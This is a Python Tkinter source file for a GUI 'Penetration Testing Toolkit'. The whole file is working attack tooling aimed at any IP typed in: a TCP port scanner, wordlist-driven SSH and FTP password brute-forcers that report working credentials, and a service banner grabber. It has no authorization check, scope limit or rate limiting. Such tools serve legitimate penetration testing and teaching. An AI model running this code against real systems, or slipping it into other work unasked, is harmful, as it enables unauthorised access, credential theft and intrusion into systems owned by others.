import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import socket
import paramiko
from ftplib import FTP

# Port Scanner
def scan_ports(ip, log):
    log.insert(tk.END, f"\n[+] Scanning ports on {ip}...\n")
    for port in range(1, 1025):
        try:
            sock = socket.socket()
            sock.settimeout(0.5)
            sock.connect((ip, port))
            log.insert(tk.END, f"[OPEN] Port {port}\n")
            sock.close()
        except:
            pass
    log.insert(tk.END, "[*] Port scan complete.\n")

# SSH Brute-force
def ssh_bruteforce(ip, username, wordlist_path, log):
    try:
        with open(wordlist_path) as f:
            passwords = f.read().splitlines()
    except:
        log.insert(tk.END, "[!] Failed to read wordlist file.\n")
        return

    for pwd in passwords:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=pwd, timeout=3)
            log.insert(tk.END, f"[SUCCESS] SSH password found: {pwd}\n")
            ssh.close()
            return
        except:
            log.insert(tk.END, f"[FAILED] {pwd}\n")
    log.insert(tk.END, "[*] SSH brute-force complete.\n")

# FTP Brute-force
def ftp_bruteforce(ip, username, wordlist_path, log):
    try:
        with open(wordlist_path) as f:
            passwords = f.read().splitlines()
    except:
        log.insert(tk.END, "[!] Failed to read wordlist file.\n")
        return

    for pwd in passwords:
        try:
            ftp = FTP(ip)
            ftp.login(user=username, passwd=pwd)
            log.insert(tk.END, f"[SUCCESS] FTP Login: {username}:{pwd}\n")
            ftp.quit()
            return
        except:
            log.insert(tk.END, f"[FAILED] {pwd}\n")
    log.insert(tk.END, "[*] FTP brute-force complete.\n")

# Banner Grabber
def banner_grabber(ip, log):
    ports = [21, 22, 23, 25, 80, 110, 143, 443, 3306, 8080]
    log.insert(tk.END, f"\n[+] Grabbing banners from {ip}...\n")
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(2)
            sock.connect((ip, port))
            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
            banner = sock.recv(1024).decode(errors='ignore')
            log.insert(tk.END, f"[{port}] Banner:\n{banner}\n")
            sock.close()
        except:
            log.insert(tk.END, f"[{port}] Closed or no banner.\n")
    log.insert(tk.END, "[*] Banner grabbing complete.\n")

# GUI Handlers
def run_port_scan():
    scan_ports(ip_entry.get(), output_box)

def run_ssh_bruteforce():
    ssh_bruteforce(ip_entry.get(), user_entry.get(), wordlist_path.get(), output_box)

def run_ftp_bruteforce():
    ftp_bruteforce(ip_entry.get(), user_entry.get(), wordlist_path.get(), output_box)

def run_banner_grab():
    banner_grabber(ip_entry.get(), output_box)

def select_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_path.set(path)

# GUI Setup
root = tk.Tk()
root.title("Penetration Testing Toolkit")
root.geometry("800x600")

# Top inputs
tk.Label(root, text="Target IP:").pack()
ip_entry = tk.Entry(root, width=40)
ip_entry.pack(pady=5)

tk.Label(root, text="Username (for brute-force):").pack()
user_entry = tk.Entry(root, width=40)
user_entry.pack(pady=5)

wordlist_path = tk.StringVar()
tk.Label(root, text="Wordlist File:").pack()
tk.Entry(root, textvariable=wordlist_path, width=50).pack(pady=5)
tk.Button(root, text="Browse Wordlist", command=select_wordlist).pack()

# Buttons for actions
tk.Button(root, text="Scan Ports", command=run_port_scan, bg="gray", fg="white").pack(pady=5)
tk.Button(root, text="SSH Brute-Force", command=run_ssh_bruteforce, bg="orange", fg="white").pack(pady=5)
tk.Button(root, text="FTP Brute-Force", command=run_ftp_bruteforce, bg="darkred", fg="white").pack(pady=5)
tk.Button(root, text="Banner Grabber", command=run_banner_grab, bg="blue", fg="white").pack(pady=5)

# Output Log
tk.Label(root, text="Output:").pack(pady=5)
output_box = scrolledtext.ScrolledText(root, width=100, height=20)
output_box.pack(pady=10)

root.mainloop()
